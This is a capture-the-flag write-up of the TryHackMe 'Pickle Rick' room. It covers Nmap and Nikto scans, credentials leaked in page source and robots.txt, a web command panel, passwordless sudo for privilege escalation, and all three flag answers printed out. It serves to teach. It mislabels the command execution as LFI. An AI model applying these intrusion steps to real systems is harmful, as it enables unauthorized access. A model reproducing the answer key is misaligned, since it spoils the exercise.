---
title: "TryHackMe: Pickle Rick"
author: Vitorx
categories: [TryHackMe]
tags: [Tryhackme Writeup, LFI, Recon, File Inclusion]
render_with_liquid: false
img_path: /images/tryhackme_pickle-rick/
image:
  path: /images/tryhackme_pickle-rick/pickle-rick_image.png
---

The TryHackMe Pickle Rick challenge is a CTF that involves exploiting a vulnerable machine. The goal is to use recon and exploitation techniques to discover and capture the flags. The main vulnerability found is the ability to execute commands via LFI (Local File Inclusion), which allows access to sensitive server files.

## Initial Analysis

To begin the exploration, we run an Nmap scan on the IP provided by the room:

```console
root@ip-10-10-142-246:~# nmap 10.10.74.179
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-03 20:50 GMT
Nmap scan report for 10.10.74.179
Host is up (0.00020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:44:84:9A:C5:DF (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

Since we don’t have credentials to access SSH, we focus our efforts on port 80. Let’s access the website.

![Web 80 Index](/images/tryhackme_pickle-rick/pickle-rick_inicial.webp){: width="1200" height="600"}

It's always good to check the page source code, so let’s do that.

```console
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

  </body>
  </html>
```

Checking the page source code, we find a revealing comment:

```console
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

This provides us with a possible username: R1ckRul3s. Now, we need to find a corresponding password.

## Exploring the Server

We continue our enumeration to find a password. For this, we decide to run Nikto, which checks for known vulnerabilities in web servers:

```console
root@kali:~# nikto -host 10.10.74.179
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.74.179
+ Target Port:        80
+ Start Time:         2025-02-03 21:00 GMT
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
+ The anti-clickjacking X-Frame-Options header is not present.
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is estranho).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-02-03 21:05 GMT
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Here, we find some interesting elements:

 - robots.txt

 - /login.php

Let's explore robots.txt first.

Accessing http://10.10.74.179/robots.txt, we find:

```console
Wubbalubbadubdub
```

The response suggests that "Wubbalubbadubdub" might be a password. Now, we can try using these credentials on the system.

Next, we try accessing /login.php, which we found with Nikto. It leads to a login portal:

![Web 80 Index](/images/tryhackme_pickle-rick/pickle-rick_login.webp){: width="1200" height="600"}

Entering the credentials, we gain access to a command panel that allows us to execute instructions directly on the server.

![Web 80 Index](/images/tryhackme_pickle-rick/pickle-rick_commandPanel.webp){: width="1200" height="600"}

Here we can execute *some* code and get the corresponding output. I put in ls and here we get some the contents of the folder and in there we have our first secret ingredient as Sup3rS3cretPickl3Ingred.txt !

![Web 80 Index](/images/tryhackme_pickle-rick/pickle-rick_files.webp){: width="1200" height="600"}

However when we put in cat Sup3rS3cretPickl3Ingred.txt as our input we get :

![Web 80 Index](/images/tryhackme_pickle-rick/pickle-rick_erro.webp){: width="1200" height="600"}

To bypass this, we access the file directly via the browser:

`http://10.10.74.179/Sup3rS3cretPickl3Ingred.txt` (Keep in mind this is my own target IP)

```console
mr. meeseek hair
```

Success! We see the first ingredient of three.

Now we need to find the other ingredients. Let's check the superuser's permissions with `sudo -l`.

![Web 80 Index](/images/tryhackme_pickle-rick/pickle-rick_pass.webp){: width="1200" height="600"}

We can run sudo commands without any password! To find the other two flags we type in `sudo ls ../../../*`

Here we have list of all folders and sub folders in root. Upon closer inspection , we find two flags as: `/home/rick/second\ ingredients` and `/root/3rd.txt`

![Web 80 Index](/images/tryhackme_pickle-rick/pickle-rick_direc.webp){: width="1200" height="600"}

Using less (sudo less in case of the third flag) we get the flags as:

```console
1 jerry tear
```

```console
fleeb juice
```

Finally we have all our secret ingredients. We work out the potion and finally transform Rick back to a human from a pickle !

## Conclusion

We completed the challenge by capturing all the flags and restoring Rick to his normal state. Throughout this exploration, we used:

✅ Network scanning to identify exposed services (Nmap) \
✅ Web directory enumeration to find sensitive information (Nikto) \
✅ Configuration file analysis to obtain credentials \
✅ Exploitation of a vulnerable command panel \
✅ Privilege escalation to gain full system access

This challenge highlights the importance of security measures such as avoiding storing credentials in source code, restricting command permissions, and implementing secure authentication. Basic security practices can prevent similar attacks and better protect exposed systems!
